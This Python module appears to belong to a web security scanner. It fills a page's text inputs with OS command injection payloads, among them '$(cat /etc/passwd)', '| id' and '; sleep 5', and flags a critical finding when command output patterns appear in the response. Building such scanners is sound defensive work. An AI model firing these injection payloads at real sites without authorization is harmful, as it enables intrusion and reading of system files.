# ruff: noqa: E501
"""Command injection test module."""

from __future__ import annotations

import re
from collections.abc import Callable
from typing import Any


async def test_command_injection(
    page: Any,
    add_finding: Callable[[dict[str, Any]], dict[str, Any]],
) -> dict[str, Any]:
    """Test input fields for OS command injection vulnerabilities."""
    url = page.url
    findings: list[dict[str, Any]] = []

    cmd_payloads = [
        "; ls -la",
        "| id",
        "`whoami`",
        "$(cat /etc/passwd)",
        "& dir",
        "|| cat /etc/hosts",
        "\n/bin/ls",
        "; sleep 5",
    ]

    targets = await page.evaluate(
        """() => {
            return Array.from(document.querySelectorAll(
                "input[type='text'], input[type='search'], input:not([type]), textarea"
            )).slice(0, 5).map((el) => ({
                name: el.name || "",
                id: el.id || "",
            }));
        }"""
    )

    if not targets:
        return {"category": "command-injection", "findings": findings, "message": "No input fields found"}

    output_patterns = [
        r"uid=\d+\(.*?\)\s+gid=",
        r"total\s+\d+",
        r"drwx[\w-]+\s+\d+",
        r"root:.*:0:0:",
        r"volume serial number",
        r"directory of",
        r"\b\w+:\s*\d+\s*\w+\s*\w+\s*\d+",
    ]

    for target in targets:
        selector = f"#{target['id']}" if target.get("id") else (
            f"[name=\"{target['name']}\"]" if target.get("name") else None
        )
        if not selector:
            continue

        for payload in cmd_payloads:
            try:
                locator = page.locator(selector).first()
                visible = await locator.is_visible()
                if not visible:
                    continue

                await locator.fill(payload)
                await locator.press("Enter")
                await page.wait_for_timeout(2000)

                content = await page.content()
                for pattern_str in output_patterns:
                    if re.search(pattern_str, content, re.IGNORECASE):
                        findings.append(
                            add_finding(
                                {
                                    "category": "command-injection",
                                    "severity": "critical",
                                    "title": "Command injection vulnerability",
                                    "description": (
                                        f'OS command output detected after injecting payload into "{selector}"'
                                    ),
                                    "url": page.url,
                                    "evidence": {
                                        "selector": selector,
                                        "payload": payload,
                                        "matchedPattern": pattern_str,
                                    },
                                }
                            )
                        )
                        break

                if any(
                    f.get("evidence", {}).get("selector") == selector
                    for f in findings
                ):
                    break
                await page.goto(url, wait_until="domcontentloaded", timeout=10000)
            except Exception:
                continue

    return {"category": "command-injection", "findings": findings}
